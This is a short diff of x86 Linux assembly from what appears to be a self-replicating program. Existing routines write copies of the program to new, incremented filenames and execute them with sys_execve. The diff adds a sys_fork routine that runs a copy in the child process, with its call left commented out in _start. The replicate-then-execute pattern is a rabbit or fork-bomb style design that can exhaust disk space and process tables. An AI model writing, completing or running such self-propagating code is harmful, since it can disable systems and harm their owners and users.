@@ -67,6 +67,13 @@ run:            mov     eax, 11                 ; 11 = sys_execve
                 int     0x80                    ; sys_execve(fname, fname, NULL)
                 ret
 
+fork:           mov     eax, 2                  ; 2 = sys_fork
+                int     0x80                    ; sys_fork()
+
+                cmp     eax, 0                  ; if eax is zero we are in the in fork
+                jz      run                     ; jump to run if eax is zero
+                ret
+
 replicate:      mov     eax, 5                  ; 5 = sys_open
                 call    inc_fname               ; Increment the filename
                 mov     ecx, 65                 ; 65 = O_WRONLY | O_CREAT
@@ -88,6 +95,7 @@ exit:           mov     bl, 0                   ; 0 = Exit code
 
 _start:         call    program
                 call    replicate
+                ; call    fork
                 call    run
                 call    exit
 
